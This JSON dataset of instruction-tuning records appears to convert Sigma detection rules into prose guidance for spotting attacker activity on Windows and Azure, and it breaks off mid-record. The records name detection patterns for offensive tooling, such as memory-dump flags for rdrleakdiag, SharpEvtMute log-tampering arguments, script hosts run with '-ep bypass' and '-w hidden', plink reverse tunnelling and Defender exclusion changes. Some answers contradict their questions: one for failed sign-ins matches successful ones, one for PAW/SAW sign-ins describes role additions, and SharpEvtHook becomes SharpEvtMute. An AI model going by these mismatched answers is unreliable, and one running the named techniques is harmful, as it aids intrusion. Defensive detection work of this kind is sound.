[
  {
    "instruction": "How to detect: Detect failed authentications from countries you do not operate out of.",
    "context": "",
    "output": "In order to detect failed authentications from countries you do not operate out of, you should focus on monitoring Azure's signinlogs for authentication attempts. Specifically, target the records for successful authentication attempts (marked as 'Success' in the Status field) and then filter these according to the location of the attempt. You should exclude from your scrutiny any login attempt that originates from countries where your organization operates (identified by checking if the Location field contains country codes such as GB or any other relevant countries, using an OR condition to list multiple). The detection logic revolves around spotting successful logins that do not fit these parameters\u2014essentially, any successful login that does not come from the predefined set of countries where your organization operates. This method aims to highlight potential unauthorized access attempts from geographic regions that are unexpected, based on your operational footprint.\n\nBe aware that there might be false positives, particularly if the detected activity was officially approved by a System Administrator. The severity level for this kind of detection is considered low due to the potential for such false positives and the nature of the detection mechanism focusing on geographical anomalies rather than direct indicators of compromise. Nonetheless, this strategy forms a part of your security posture by leveraging geographical data to flag potentially unauthorised access attempts, aligning with MITRE ATT&CK tactics and techniques related to Initial Access and validating the importance of monitoring and analyzing signinlogs within Azure environments.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detect failed authentications from countries you do not operate out of.",
      "answer": "In order to detect failed authentications from countries you do not operate out of, you should focus on monitoring Azure's signinlogs for authentication attempts. Specifically, target the records for successful authentication attempts (marked as 'Success' in the Status field) and then filter these according to the location of the attempt. You should exclude from your scrutiny any login attempt that originates from countries where your organization operates (identified by checking if the Location field contains country codes such as GB or any other relevant countries, using an OR condition to list multiple). The detection logic revolves around spotting successful logins that do not fit these parameters\u2014essentially, any successful login that does not come from the predefined set of countries where your organization operates. This method aims to highlight potential unauthorized access attempts from geographic regions that are unexpected, based on your operational footprint.\n\nBe aware that there might be false positives, particularly if the detected activity was officially approved by a System Administrator. The severity level for this kind of detection is considered low due to the potential for such false positives and the nature of the detection mechanism focusing on geographical anomalies rather than direct indicators of compromise. Nonetheless, this strategy forms a part of your security posture by leveraging geographical data to flag potentially unauthorised access attempts, aligning with MITRE ATT&CK tactics and techniques related to Initial Access and validating the importance of monitoring and analyzing signinlogs within Azure environments."
    }
  },
  {
    "instruction": "How to detect: use of the Microsoft Windows Resource Leak Diagnostic tool \"rdrleakdiag.exe\" to dump process memory",
    "context": "",
    "output": "In order to detect the use of the Microsoft Windows Resource Leak Diagnostic tool \"rdrleakdiag.exe\" to dump process memory, you should: Monitor the creation of processes on Windows systems, specifically looking for instances where the process image ends with '\\rdrleakdiag.exe' or where the OriginalFileName is explicitly 'RdrLeakDiag.exe'. Additionally, scrutinize command-line parameters to identify attempts to dump memory. Key command-line options to watch for include 'fullmemdmp', '/memdmp', and '-memdmp' which indicate an operation to dump memory. Also, be alert for options such as ' -o ', ' /o ', which specify the output location for the dump file, and ' -p ', ' /p ', which indicate a target process for the memory dump. These indicators, particularly when occurring together, suggest an effort to misuse \"rdrleakdiag.exe\" for acquiring process memory data, which could be indicative of malicious activities such as information gathering or the facilitation of further attacks. Be aware that while monitoring for these signs, there may be instances where the use of these command-line arguments and the \"rdrleakdiag.exe\" process occur in non-malicious contexts; such instances are considered unknown false positives. The detection of any of the outlined command-line conditions in conjunction with the execution of \"rdrleakdiag.exe\" should be treated with a high level of suspicion and investigated promptly.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of the Microsoft Windows Resource Leak Diagnostic tool \"rdrleakdiag.exe\" to dump process memory",
      "answer": "In order to detect the use of the Microsoft Windows Resource Leak Diagnostic tool \"rdrleakdiag.exe\" to dump process memory, you should: Monitor the creation of processes on Windows systems, specifically looking for instances where the process image ends with '\\rdrleakdiag.exe' or where the OriginalFileName is explicitly 'RdrLeakDiag.exe'. Additionally, scrutinize command-line parameters to identify attempts to dump memory. Key command-line options to watch for include 'fullmemdmp', '/memdmp', and '-memdmp' which indicate an operation to dump memory. Also, be alert for options such as ' -o ', ' /o ', which specify the output location for the dump file, and ' -p ', ' /p ', which indicate a target process for the memory dump. These indicators, particularly when occurring together, suggest an effort to misuse \"rdrleakdiag.exe\" for acquiring process memory data, which could be indicative of malicious activities such as information gathering or the facilitation of further attacks. Be aware that while monitoring for these signs, there may be instances where the use of these command-line arguments and the \"rdrleakdiag.exe\" process occur in non-malicious contexts; such instances are considered unknown false positives. The detection of any of the outlined command-line conditions in conjunction with the execution of \"rdrleakdiag.exe\" should be treated with a high level of suspicion and investigated promptly."
    }
  },
  {
    "instruction": "Can you explain how to detect: access to a webshell dropped into a keystore folder on the WebLogic server",
    "context": "",
    "output": "Certainly!\n\nIn order to detect access to a webshell dropped into a keystore folder on the WebLogic server, you should monitor web server logs for any requests targeting JavaScript files (.js) located within the \"/config/keystore/\" directory path. Pay particular attention to the 'cs-uri-query' field in the logs, which should match the pattern '*/config/keystore/*.js*'. It's crucial to capture and scrutinize both the client IP ('c-ip') and client DNS name ('c-dns') to trace the source of the request. Despite potential unknowns that may initially not seem malicious, the critical nature of this activity demands undivided attention due to its association with techniques commonly employed during cyber attacks. This approach is essential in identifying potentially malicious activities targeting sensitive parts of a WebLogic server infrastructure.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "access to a webshell dropped into a keystore folder on the WebLogic server",
      "answer": "In order to detect access to a webshell dropped into a keystore folder on the WebLogic server, you should monitor web server logs for any requests targeting JavaScript files (.js) located within the \"/config/keystore/\" directory path. Pay particular attention to the 'cs-uri-query' field in the logs, which should match the pattern '*/config/keystore/*.js*'. It's crucial to capture and scrutinize both the client IP ('c-ip') and client DNS name ('c-dns') to trace the source of the request. Despite potential unknowns that may initially not seem malicious, the critical nature of this activity demands undivided attention due to its association with techniques commonly employed during cyber attacks. This approach is essential in identifying potentially malicious activities targeting sensitive parts of a WebLogic server infrastructure."
    }
  },
  {
    "instruction": "Can you explain how to detect: use of SharpEvtHook, a tool that tampers with the Windows event logs",
    "context": "",
    "output": "Certainly!\n\nIn order to detect the use of SharpEvtHook, a tool that tampers with the Windows event logs, you should: Focus on monitoring process creation events within Windows. Specifically, look for any processes where the image name ends with '\\SharpEvtMute.exe' or the description directly mentions 'SharpEvtMute'. Additionally, pay close attention to command line arguments that include phrases like '--Filter \"rule ' or '--Encoded --Filter \\\"', as these are indicative of attempts to manipulate or filter Windows event logs using SharpEvtMute. This analysis is considered to have a high level of importance due to the potential misuse of SharpEvtMute in evading detection or altering logs to hide malicious activity. Keep in mind, though, the possibility of false positives is unknown, indicating the necessity for manual verification of detections. This approach aligns with tactics and techniques often employed by attackers to evade detection, specifically those relating to the manipulation of system logging processes.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of SharpEvtHook, a tool that tampers with the Windows event logs",
      "answer": "In order to detect the use of SharpEvtHook, a tool that tampers with the Windows event logs, you should: Focus on monitoring process creation events within Windows. Specifically, look for any processes where the image name ends with '\\SharpEvtMute.exe' or the description directly mentions 'SharpEvtMute'. Additionally, pay close attention to command line arguments that include phrases like '--Filter \"rule ' or '--Encoded --Filter \\\"', as these are indicative of attempts to manipulate or filter Windows event logs using SharpEvtMute. This analysis is considered to have a high level of importance due to the potential misuse of SharpEvtMute in evading detection or altering logs to hide malicious activity. Keep in mind, though, the possibility of false positives is unknown, indicating the necessity for manual verification of detections. This approach aligns with tactics and techniques often employed by attackers to evade detection, specifically those relating to the manipulation of system logging processes."
    }
  },
  {
    "instruction": "Please help me detect the following: creation of a malicious DLL file in the location where the OneDrive or Team applications\nUpon execution of the Teams or OneDrive application, the dropped malicious DLL file (\u201ciphlpapi.dll\u201d) is sideloaded\n",
    "context": "",
    "output": "Sure!\nIn order to detect creation of a malicious DLL file in the location where the OneDrive or Team applications upon execution of the Teams or OneDrive application, the dropped malicious DLL file (\u201ciphlpapi.dll\u201d) is sideloaded, you should: monitor file events within Windows systems specifically focusing on the creation of files. Look for the creation of files named 'iphlpapi.dll' within the '\\AppData\\Local\\Microsoft' directory. This activity is indicative of an attempt to exploit the legitimate loading of the 'iphlpapi.dll' file by either OneDrive or Teams applications for malicious purposes, known as DLL sideloading. Such actions might not have known false positives due to the specific nature of the file and its uncommon directory for legitimate use. The risk level for this detection is considered high, underscoring the importance of monitoring for this activity to prevent potential security breaches or malware execution.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "creation of a malicious DLL file in the location where the OneDrive or Team applications\nUpon execution of the Teams or OneDrive application, the dropped malicious DLL file (\u201ciphlpapi.dll\u201d) is sideloaded\n",
      "answer": "In order to detect creation of a malicious DLL file in the location where the OneDrive or Team applications upon execution of the Teams or OneDrive application, the dropped malicious DLL file (\u201ciphlpapi.dll\u201d) is sideloaded, you should: monitor file events within Windows systems specifically focusing on the creation of files. Look for the creation of files named 'iphlpapi.dll' within the '\\AppData\\Local\\Microsoft' directory. This activity is indicative of an attempt to exploit the legitimate loading of the 'iphlpapi.dll' file by either OneDrive or Teams applications for malicious purposes, known as DLL sideloading. Such actions might not have known false positives due to the specific nature of the file and its uncommon directory for legitimate use. The risk level for this detection is considered high, underscoring the importance of monitoring for this activity to prevent potential security breaches or malware execution."
    }
  },
  {
    "instruction": "How to detect: NetSupport Manager service installation on the target system.",
    "context": "",
    "output": "In order to detect NetSupport Manager service installation on the target system, you should focus on monitoring Windows System logs for specific events that signal the installation of this service. Look for logs generated by the 'Service Control Manager' indicating the creation of a new service with an event ID of 7045. Specifically, pay attention to services with the image path containing '\\NetSupport Manager\\client32.exe' and/or services named 'Client32'. This activity is noteworthy as it involves the installation of the NetSupport Manager, which could potentially be used maliciously, although it is important to note that there could be legitimate uses of this tool as well. In terms of cyber security, this behavior aligns with tactics and techniques of execution and persistence, indicating an attempt to establish control over the target system. Assessing the context in which the service was installed is crucial for determining whether it constitutes a security threat or is part of legitimate activity.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "NetSupport Manager service installation on the target system.",
      "answer": "In order to detect NetSupport Manager service installation on the target system, you should focus on monitoring Windows System logs for specific events that signal the installation of this service. Look for logs generated by the 'Service Control Manager' indicating the creation of a new service with an event ID of 7045. Specifically, pay attention to services with the image path containing '\\NetSupport Manager\\client32.exe' and/or services named 'Client32'. This activity is noteworthy as it involves the installation of the NetSupport Manager, which could potentially be used maliciously, although it is important to note that there could be legitimate uses of this tool as well. In terms of cyber security, this behavior aligns with tactics and techniques of execution and persistence, indicating an attempt to establish control over the target system. Assessing the context in which the service was installed is crucial for determining whether it constitutes a security threat or is part of legitimate activity."
    }
  },
  {
    "instruction": "Explain how should I detect the following: possible bypass EDR and SIEM via abnormal user account name.",
    "context": "",
    "output": "In order to detect possible bypass EDR and SIEM via abnormal user account name, you should: Monitor for specific events within Windows Security logs that may indicate suspicious activity related to user accounts. Keep an eye out for events where a new user account is created (Event ID 4720) or an existing user account is renamed (Event ID 4781), especially if the account name contains a '$' symbol, as this could signify an attempt to create hidden or system accounts that are typically not scrutinized. These actions may be used by attackers to evade detection mechanisms. Pay attention to the event details such as the account name involved in the creation or renaming process (SamAccountName for creation, NewTargetUserName for renaming), as well as the user who executed the action (SubjectUserName). Although there might be legitimate cases where accounts with a '$' in the name are created, these occurrences are unusual and should be investigated to rule out malicious intent.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "possible bypass EDR and SIEM via abnormal user account name.",
      "answer": "In order to detect possible bypass EDR and SIEM via abnormal user account name, you should: Monitor for specific events within Windows Security logs that may indicate suspicious activity related to user accounts. Keep an eye out for events where a new user account is created (Event ID 4720) or an existing user account is renamed (Event ID 4781), especially if the account name contains a '$' symbol, as this could signify an attempt to create hidden or system accounts that are typically not scrutinized. These actions may be used by attackers to evade detection mechanisms. Pay attention to the event details such as the account name involved in the creation or renaming process (SamAccountName for creation, NewTargetUserName for renaming), as well as the user who executed the action (SubjectUserName). Although there might be legitimate cases where accounts with a '$' in the name are created, these occurrences are unusual and should be investigated to rule out malicious intent."
    }
  },
  {
    "instruction": "How can I detect: suspicious script execution in temporary folders or folders accessible by environment variables",
    "context": "",
    "output": "In order to detect a suspicious script execution in temporary folders or folders accessible by environment variables, you should focus on monitoring the creation of processes on Windows systems. Specifically, watch for the execution of `cscript.exe`, `mshta.exe`, or `wscript.exe` scripts, which are commonly utilized by attackers for executing malicious code through scripts. Be vigilant for command line flags that attempt to bypass execution policies (`-ep bypass`, ` -ExecutionPolicy bypass`) or run scripts in a hidden window (`-w hidden`), as well as attempts to execute JavaScript or VBScript (`/e:javascript`, `/e:Jscript`, `/e:vbscript`). Additionally, scrutinize any script execution occurring within certain directories that are commonly abused by threat actors, including temporary folders like `\\AppData\\Local\\Temp`, `\\Windows\\Temp`, or folders normally accessible through environment variables such as `:\\Perflogs\\`, `:\\Users\\Public\\`. Special attention should be given to scripts run from user directories in combination with specific subfolders like `\\Favorites\\`, `\\Favourites\\`, or `\\Contacts\\`, which could signify an attempt to leverage user profiles for malicious purposes. This vigilance aids in identifying tactics and techniques related to execution and persistence, among others, which are pivotal for safeguarding against possible threats.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious script execution in temporary folders or folders accessible by environment variables",
      "answer": "In order to detect a suspicious script execution in temporary folders or folders accessible by environment variables, you should focus on monitoring the creation of processes on Windows systems. Specifically, watch for the execution of `cscript.exe`, `mshta.exe`, or `wscript.exe` scripts, which are commonly utilized by attackers for executing malicious code through scripts. Be vigilant for command line flags that attempt to bypass execution policies (`-ep bypass`, ` -ExecutionPolicy bypass`) or run scripts in a hidden window (`-w hidden`), as well as attempts to execute JavaScript or VBScript (`/e:javascript`, `/e:Jscript`, `/e:vbscript`). Additionally, scrutinize any script execution occurring within certain directories that are commonly abused by threat actors, including temporary folders like `\\AppData\\Local\\Temp`, `\\Windows\\Temp`, or folders normally accessible through environment variables such as `:\\Perflogs\\`, `:\\Users\\Public\\`. Special attention should be given to scripts run from user directories in combination with specific subfolders like `\\Favorites\\`, `\\Favourites\\`, or `\\Contacts\\`, which could signify an attempt to leverage user profiles for malicious purposes. This vigilance aids in identifying tactics and techniques related to execution and persistence, among others, which are pivotal for safeguarding against possible threats."
    }
  },
  {
    "instruction": "Can you explain how to detect: Remote.exe is part of WinDbg in the Windows SDK and can be used for AWL bypass and running remote files.",
    "context": "",
    "output": "Certainly!\n\nIn order to detect attempts to misuse Remote.exe, which is part of WinDbg in the Windows SDK and can be used for AWL bypass and running remote files, you should: focus on monitoring process creation activity on Windows systems. Specifically, attention should be directed at instances where processes are initiated and the associated image file name ends with '\\remote.exe' or the original file name is exactly 'remote.exe'. This approach is guided by recognizing the potential exploitation of Remote.exe for unauthorized actions. However, it is crucial to account for legitimate use cases, such as approved installations of the Windows SDK with Debugging Tools for Windows (WinDbg), which are recognized as potential sources of false positives. The sensitivity of detection for this activity is categorized as medium, indicating a balanced approach to identifying potential threats while minimizing unnecessary alerts.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Remote.exe is part of WinDbg in the Windows SDK and can be used for AWL bypass and running remote files.",
      "answer": "In order to detect attempts to misuse Remote.exe, which is part of WinDbg in the Windows SDK and can be used for AWL bypass and running remote files, you should: focus on monitoring process creation activity on Windows systems. Specifically, attention should be directed at instances where processes are initiated and the associated image file name ends with '\\remote.exe' or the original file name is exactly 'remote.exe'. This approach is guided by recognizing the potential exploitation of Remote.exe for unauthorized actions. However, it is crucial to account for legitimate use cases, such as approved installations of the Windows SDK with Debugging Tools for Windows (WinDbg), which are recognized as potential sources of false positives. The sensitivity of detection for this activity is categorized as medium, indicating a balanced approach to identifying potential threats while minimizing unnecessary alerts."
    }
  },
  {
    "instruction": "Please help me detect the following: Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images",
    "context": "",
    "output": "Sure!\nIn order to detect suspicious activities involving the Deployment Image Servicing and Management tool (DISM), which is used to enumerate, install, uninstall, configure, and update features and packages in Windows images, you should monitor process creation logs on Windows systems for executions of `DismHost.exe` or `Dism.exe`. Specifically, you should look for instances where these processes are initiated with command-line arguments that include both '/Online' and '/Disable-Feature'. These parameters indicate an attempt to disable certain features of the Windows system online, which can be indicative of an adversary's attempt to manipulate system configurations to their advantage or to disable security features. It\u2019s important to note that while this activity can be legitimate, it could also represent malicious behavior. Any detections should be reviewed to distinguish between benign use by system administrators and potentially malicious activity. The level of concern for these detections is categorized as medium, acknowledging that there exists a possibility for false positives, particularly in environments where scripts or automation tools legitimately use these command-line arguments for system maintenance.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images",
      "answer": "In order to detect suspicious activities involving the Deployment Image Servicing and Management tool (DISM), which is used to enumerate, install, uninstall, configure, and update features and packages in Windows images, you should monitor process creation logs on Windows systems for executions of `DismHost.exe` or `Dism.exe`. Specifically, you should look for instances where these processes are initiated with command-line arguments that include both '/Online' and '/Disable-Feature'. These parameters indicate an attempt to disable certain features of the Windows system online, which can be indicative of an adversary's attempt to manipulate system configurations to their advantage or to disable security features. It\u2019s important to note that while this activity can be legitimate, it could also represent malicious behavior. Any detections should be reviewed to distinguish between benign use by system administrators and potentially malicious activity. The level of concern for these detections is categorized as medium, acknowledging that there exists a possibility for false positives, particularly in environments where scripts or automation tools legitimately use these command-line arguments for system maintenance."
    }
  },
  {
    "instruction": "Explain how should I detect the following: suspicious Plink tunnel port forwarding to a local port",
    "context": "",
    "output": "In order to detect suspicious Plink tunnel port forwarding to a local port, you should monitor process creation logs on Windows systems. Look for any activities that match the description of using a command-line SSH, Telnet, and Rlogin client with an emphasis on command line execution containing ' -R ', which indicates the attempt to set up remote port forwarding to a local port. It's essential to be mindful of false positives which may occur due to legitimate administrative activities that utilize remote port forwarding to a local port. These detections carry a high level of importance due to their potential use in bypassing network security measures and facilitating unauthorized access. The tactical categorizations related to this behavior include Command and Control, and Tactic Techniques such as \"Remote Services: SSH\" and \"Port Forwarding.\"",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious Plink tunnel port forwarding to a local port",
      "answer": "In order to detect suspicious Plink tunnel port forwarding to a local port, you should monitor process creation logs on Windows systems. Look for any activities that match the description of using a command-line SSH, Telnet, and Rlogin client with an emphasis on command line execution containing ' -R ', which indicates the attempt to set up remote port forwarding to a local port. It's essential to be mindful of false positives which may occur due to legitimate administrative activities that utilize remote port forwarding to a local port. These detections carry a high level of importance due to their potential use in bypassing network security measures and facilitating unauthorized access. The tactical categorizations related to this behavior include Command and Control, and Tactic Techniques such as \"Remote Services: SSH\" and \"Port Forwarding.\""
    }
  },
  {
    "instruction": "How to detect: connections to interplanetary file system (IPFS) containing a user's email address which mirrors behaviours observed in recent phishing campaigns leveraging IPFS to host credential harvesting webpages.",
    "context": "",
    "output": "In order to detect connections to interplanetary file system (IPFS) containing a user's email address which mirrors behaviours observed in recent phishing campaigns leveraging IPFS to host credential harvesting webpages, you should monitor proxy logs for any Uniform Resource Identifiers (URIs) that match a specific pattern indicating they are part of the IPFS network and include what seems to be a user's email address. Specifically, look for URIs that contain 'ipfs.io/' or 'ipfs.io ' followed by any characters and an '@' symbol, which typically signifies an email address. This pattern helps identify potential phishing attempts exploiting IPFS to host malicious webpages designed to capture credentials. It's important to note that there may be legitimate uses of IPFS within an organization, but the specific pattern focusing on the presence of an email address within the URI is less likely to represent normal activity and more likely to indicate a phishing attempt. The sensitivity of the rule is considered low due to the possibility of false positives in environments where IPFS is used for legitimate purposes.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "connections to interplanetary file system (IPFS) containing a user's email address which mirrors behaviours observed in recent phishing campaigns leveraging IPFS to host credential harvesting webpages.",
      "answer": "In order to detect connections to interplanetary file system (IPFS) containing a user's email address which mirrors behaviours observed in recent phishing campaigns leveraging IPFS to host credential harvesting webpages, you should monitor proxy logs for any Uniform Resource Identifiers (URIs) that match a specific pattern indicating they are part of the IPFS network and include what seems to be a user's email address. Specifically, look for URIs that contain 'ipfs.io/' or 'ipfs.io ' followed by any characters and an '@' symbol, which typically signifies an email address. This pattern helps identify potential phishing attempts exploiting IPFS to host malicious webpages designed to capture credentials. It's important to note that there may be legitimate uses of IPFS within an organization, but the specific pattern focusing on the presence of an email address within the URI is less likely to represent normal activity and more likely to indicate a phishing attempt. The sensitivity of the rule is considered low due to the possibility of false positives in environments where IPFS is used for legitimate purposes."
    }
  },
  {
    "instruction": "Explain how should I detect the following: Setting of Windows Defender Exclusions",
    "context": "",
    "output": "In order to detect the setting of Windows Defender exclusions, you should monitor Windows registry modification events specifically related to Windows Defender exclusions settings. Focus on the Windows event log entries that come from registry settings adjustments (category: registry_set) and look for events where the type of event is 'SetValue'. This event type indicates that a registry value was changed, which in this context means a potential modification to the Windows Defender exclusions list. Specifically, concentrate on entries where the targeted registry object includes the path '\\Microsoft\\Windows Defender\\Exclusions'. These are indicative of changes to the list of files, folders, file types, or processes excluded from scanning by Windows Defender, a common tactic used by attackers to avoid detection. However, be aware that not all changes to this list are malicious. Legitimate administrator actions can include modifications to the exclusions list for various reasons, and these should be considered as possible false positives. The severity level associated with detecting changes to the Windows Defender exclusions list is deemed medium, reflecting the balance between the potential for this activity to represent a security threat and the possibility of legitimate administrative actions.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Setting of Windows Defender Exclusions",
      "answer": "In order to detect the setting of Windows Defender exclusions, you should monitor Windows registry modification events specifically related to Windows Defender exclusions settings. Focus on the Windows event log entries that come from registry settings adjustments (category: registry_set) and look for events where the type of event is 'SetValue'. This event type indicates that a registry value was changed, which in this context means a potential modification to the Windows Defender exclusions list. Specifically, concentrate on entries where the targeted registry object includes the path '\\Microsoft\\Windows Defender\\Exclusions'. These are indicative of changes to the list of files, folders, file types, or processes excluded from scanning by Windows Defender, a common tactic used by attackers to avoid detection. However, be aware that not all changes to this list are malicious. Legitimate administrator actions can include modifications to the exclusions list for various reasons, and these should be considered as possible false positives. The severity level associated with detecting changes to the Windows Defender exclusions list is deemed medium, reflecting the balance between the potential for this activity to represent a security threat and the possibility of legitimate administrative actions."
    }
  },
  {
    "instruction": "How can I detect: Csi.exe is a signed binary from Microsoft that comes with Visual Studio and provides C# interactive capabilities. It can be used to run C# code from a file passed as a parameter in command line. Early version of this utility provided with Microsoft \u201cRoslyn\u201d Community Technology Preview was named 'rcsi.exe'",
    "context": "",
    "output": "In order to detect potential abuse of the 'csi.exe' and 'rcsi.exe' binaries which are legitimate Microsoft-signed executables from Visual Studio and are intended for running C# code interactively, often through the command line, you should:\n\nMonitor for the creation of processes that are named 'csi.exe' or 'rcsi.exe'. This can be identified when the executable image ends with these specific names or when the original file name matches 'csi.exe' or 'rcsi.exe'. Additionally, any command-line invocation of these executables coming from an entity identified as 'Microsoft Corporation' should be closely scrutinized. It's essential to capture key details such as the computer name, user account, full command line used to launch the process, and the parent command line if available. This allows for a comprehensive understanding of the context surrounding potential misuse. However, it\u2019s important to note that these utilities might be legitimately used by software developers; thus, some alerts might represent false positives. The monitoring approach should consider the balance between detecting malicious activity and minimizing interruptions to legitimate software development practices. These checks mainly focus on the tactics and techniques related to the execution phase of an attack, specifically monitoring the execution of Windows processes that could potentially be abused by attackers.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Csi.exe is a signed binary from Microsoft that comes with Visual Studio and provides C# interactive capabilities. It can be used to run C# code from a file passed as a parameter in command line. Early version of this utility provided with Microsoft \u201cRoslyn\u201d Community Technology Preview was named 'rcsi.exe'",
      "answer": "In order to detect potential abuse of the 'csi.exe' and 'rcsi.exe' binaries which are legitimate Microsoft-signed executables from Visual Studio and are intended for running C# code interactively, often through the command line, you should:\n\nMonitor for the creation of processes that are named 'csi.exe' or 'rcsi.exe'. This can be identified when the executable image ends with these specific names or when the original file name matches 'csi.exe' or 'rcsi.exe'. Additionally, any command-line invocation of these executables coming from an entity identified as 'Microsoft Corporation' should be closely scrutinized. It's essential to capture key details such as the computer name, user account, full command line used to launch the process, and the parent command line if available. This allows for a comprehensive understanding of the context surrounding potential misuse. However, it\u2019s important to note that these utilities might be legitimately used by software developers; thus, some alerts might represent false positives. The monitoring approach should consider the balance between detecting malicious activity and minimizing interruptions to legitimate software development practices. These checks mainly focus on the tactics and techniques related to the execution phase of an attack, specifically monitoring the execution of Windows processes that could potentially be abused by attackers."
    }
  },
  {
    "instruction": "How to detect: Microsoft Cloud App Security reported suspicious email forwarding rules, for example, if a user created an inbox rule that forwards a copy of all emails to an external address.",
    "context": "",
    "output": "In order to detect when a Microsoft Cloud App Security reported suspicious email forwarding rules, for example, if a user created an inbox rule that forwards a copy of all emails to an external address, you should focus on monitoring logs from Microsoft 365 services, specifically those classified under the threat management service product. Look for logs coming from the SecurityComplianceCenter as the event source. Pay special attention to events named 'Suspicious inbox forwarding' that have a status of 'success'. This activity is indicative of potentially unauthorized or malicious attempts to automate the forwarding of emails to external parties, which could lead to data leakage or compromise. The level of threat is considered low but should not be ignored due to the potential risks involved. It's important to note that there might be cases where legitimate forwarding rules trigger alerts; thus, unknown instances should be treated as potential false positives and investigated accordingly.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Microsoft Cloud App Security reported suspicious email forwarding rules, for example, if a user created an inbox rule that forwards a copy of all emails to an external address.",
      "answer": "In order to detect when a Microsoft Cloud App Security reported suspicious email forwarding rules, for example, if a user created an inbox rule that forwards a copy of all emails to an external address, you should focus on monitoring logs from Microsoft 365 services, specifically those classified under the threat management service product. Look for logs coming from the SecurityComplianceCenter as the event source. Pay special attention to events named 'Suspicious inbox forwarding' that have a status of 'success'. This activity is indicative of potentially unauthorized or malicious attempts to automate the forwarding of emails to external parties, which could lead to data leakage or compromise. The level of threat is considered low but should not be ignored due to the potential risks involved. It's important to note that there might be cases where legitimate forwarding rules trigger alerts; thus, unknown instances should be treated as potential false positives and investigated accordingly."
    }
  },
  {
    "instruction": "Explain how should I detect the following: various indicators of Microsoft Connection Manager Profile Installer execution",
    "context": "",
    "output": "In order to detect various indicators of Microsoft Connection Manager Profile Installer execution, you should: focus on monitoring process access logs within Windows environments. Specifically, look for any process access events where the call trace includes a reference to 'cmlua.dll', as this is indicative of the Microsoft Connection Manager Profile Installer's activity. Important fields to examine for suspicious activity include the CommandLine, ParentCommandLine, and Details associated with the event. While it's important to be aware that there are legitimate uses of the Connection Manager Profile Installer, these are considered unlikely in modern enterprise environments, and any detection should be treated with a high level of suspicion.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "various indicators of Microsoft Connection Manager Profile Installer execution",
      "answer": "In order to detect various indicators of Microsoft Connection Manager Profile Installer execution, you should: focus on monitoring process access logs within Windows environments. Specifically, look for any process access events where the call trace includes a reference to 'cmlua.dll', as this is indicative of the Microsoft Connection Manager Profile Installer's activity. Important fields to examine for suspicious activity include the CommandLine, ParentCommandLine, and Details associated with the event. While it's important to be aware that there are legitimate uses of the Connection Manager Profile Installer, these are considered unlikely in modern enterprise environments, and any detection should be treated with a high level of suspicion."
    }
  },
  {
    "instruction": "How can I detect: failed sign-in from a PAW or SAW device",
    "context": "",
    "output": "In order to detect failed sign-in from a PAW or SAW device, you should: monitor Azure sign-in logs for specific activities that may signal unauthorized or suspicious behavior. This involves tracking messages related to the addition of members to roles which has been completed (indicative of Privileged Identity Management activations). It is crucial to discern between legitimate and potentially harmful activities by correlating the location of the sign-in attempt with a list of countries you operate out of. Any sign-in attempt originating from IP addresses not pre-approved, using unapproved devices, or from devices that are not compliant with your security policies should be flagged. Pay attention to both successful and failure status entries, as both can provide valuable insights into potential security breaches or attempts. Be aware that not using a Privileged Access Workstation (PAW) or Secure Access Workstation (SAW) in your environment might lead to false positives. Such meticulous monitoring is regarded with a high level of importance due to the potential security implications it carries.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "failed sign-in from a PAW or SAW device",
      "answer": "In order to detect failed sign-in from a PAW or SAW device, you should: monitor Azure sign-in logs for specific activities that may signal unauthorized or suspicious behavior. This involves tracking messages related to the addition of members to roles which has been completed (indicative of Privileged Identity Management activations). It is crucial to discern between legitimate and potentially harmful activities by correlating the location of the sign-in attempt with a list of countries you operate out of. Any sign-in attempt originating from IP addresses not pre-approved, using unapproved devices, or from devices that are not compliant with your security policies should be flagged. Pay attention to both successful and failure status entries, as both can provide valuable insights into potential security breaches or attempts. Be aware that not using a Privileged Access Workstation (PAW) or Secure Access Workstation (SAW) in your environment might lead to false positives. Such meticulous monitoring is regarded with a high level of importance due to the potential security implications it carries."
    }
  },
  {
    "instruction": "How to detect: Obfuscated use of Environment Variables to execute PowerShell",
    "context": "",
